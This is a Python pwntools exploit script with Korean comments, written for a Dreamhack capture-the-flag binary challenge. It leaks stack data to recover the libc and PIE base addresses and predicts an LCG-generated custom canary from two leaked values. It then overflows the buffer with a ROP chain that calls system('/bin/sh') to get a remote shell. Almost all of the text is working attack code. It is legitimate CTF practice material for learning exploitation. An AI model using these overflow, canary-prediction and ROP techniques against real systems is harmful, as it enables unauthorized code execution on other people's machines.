'''
FULL RELRO, NX, PIE, SHSTK, IBT 적용됨
문제 푸는 방향 -> 스캑 카나리와 같은 느낌으로 미나리가 존재
미나리값이 while문 안에서 돌때마다 계속 바뀜으로, 다음 미나리값 예측이 필요
mul, inc, seed 값이 전역변수로 선언되어 있어서, 찾아야함
-> lcg여서 예측이 가능하다!!!
PIE가 적용되어 있어서, PIE의 base address를 알아내야함
미나리값 예측 후, BOF로 ROP chain 구성 

# using both binary gadget and libc 
'''
from pwn import *
from Crypto.Util.number import inverse
context.arch='amd64'
context.log_level='debug'

p = remote("host1.dreamhack.games",22434)
#p = process("./prob")
#gdb.attach(p)
e = ELF("./prob")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") # libc 파일 경로
rop =ROP(e) # ROP 객체 생성

# 복귀주소 leak
p.recvuntil(b"Enter a string > ")
payload = b"A" *264 #미니라가 있는 영역 전까지
p.send(payload)
p.recvuntil(payload)
ret_addr = u64(p.recvn(6).ljust(8,b'\x00'))  # 복귀주소 leak
offset = 0x21ca +0x28000 # 복귀주소로 부터 라이브러리 베이스까지의 거리
libc.address = ret_addr - offset
binsh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']

# main leak
p.recvuntil(b"Enter a string > ")
payload = b"A" *296 #미니라가 있는 영역 전까지
p.send(payload)
p.recvuntil(payload)
main = u64(p.recvn(6).ljust(8,b'\x00'))  # 복귀주소 leak
e.address = main - e.symbols['main'] # PIE의 베이스 주소 계산
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0] + e.address # pop rdi; ret; 가젯 주소
ret_gadget = rop.find_gadget(['ret'])[0] + e.address # ret 가젯의 주소

# 다음 미나리 값 예측을 위한 미나리값 leak 1
p.recvuntil(b"Enter a string > ")
payload = b"A" *248 #미니라가 있는 영역 전까지
p.send(payload)
p.recvuntil(payload)

minary = u64(p.recvn(8)) #미니라 값 받기
x1 = (minary >> 32)& 0xFFFFFFFF # 미니라 값의 상위 32비트
x2 = minary & 0xFFFFFFFF # 미니라 값의 하위 32비트

#로깅
log.info(f"minary: {hex(minary)}")
log.info(f"x1(high) : {hex(x1)}")
log.info(f"x2(low): {hex(x2)}")

# 다음 미나리 값 예측을 위한 미나리값 leak 2
p.recvuntil(b"Enter a string > ")
payload = b"A" *248 #미니라가 있는 영역 전까지
p.send(payload)
p.recvuntil(payload)

minary = u64(p.recvn(8)) #미니라 값 받기
x3 = (minary >> 32)& 0xFFFFFFFF # 미니라 값의 상위 32비트
x4 = minary & 0xFFFFFFFF # 미니라 값의 하위 32비트
#로깅
log.info(f"minary: {hex(minary)}")
log.info(f"x3(high) : {hex(x3)}")
log.info(f"x4(low) : {hex(x4)}")
log.info(f"ret_addr: {hex(ret_addr)}")

# 다음 미나리 값 예측
m = 1<<32
if (x2 - x1)%2 == 0: # 역원 계산 불가능 다시 돌려
    print("미나리값 예측 불가")
    p.close()
mul = ((x3 - x2)*inverse((x2-x1),m))% m
inc = (x2 - mul * x1) % m	
x5 = ((mul * x4) + inc) % m # 다음 미나리 값 예측
x6 = ((mul * x5) + inc) % m # 다음 미나리 값 예측
minary=(x5<<32|x6)# 다음 미나리 값 
log.info(f"mul: {hex(mul)}")
log.info(f"inc: {hex(inc)}")
log.info(f"minary high: {hex(x5)}")
log.info(f"minary low: {hex(x6)}")
log.info(f"predicted minary: {hex(minary)}")

p.recvuntil(b"Enter a string > ")
# ROP chain 구성 ROP chain 구성 
# 라이브러리 + 바이너리
payload = b"quit"
payload += b"A" *244 # 미니라가 있는 영역 전까지
payload += p64(minary) # 미나리 값
payload += b"B" * 8# sfp 덮어쓰기
payload += p64(ret_gadget) # pop rdi; ret 가젯의 주소
payload += p64(pop_rdi) # pop rdi; ret 가젯의 주소
payload += p64(binsh) # "/bin/sh" 문자열의 절대 주소
payload += p64(system) # system 함수의 절대 주소
log.info(f"bin pie_base {hex(e.address)}")
log.info(f"ret gadget {hex(ret_gadget)}")
log.info(f"pop rdi {hex(pop_rdi)}")
log.info(f"ret_addr: {hex(ret_addr)}")
log.info(f"libc base {hex(libc.address)}")
log.info(f"binsh {hex(binsh)}")
log.info(f"system {hex(system)}")

p.send(payload)
p.recvuntil(b"Goodbye!") 
p.sendline(b"ls")
p.interactive()
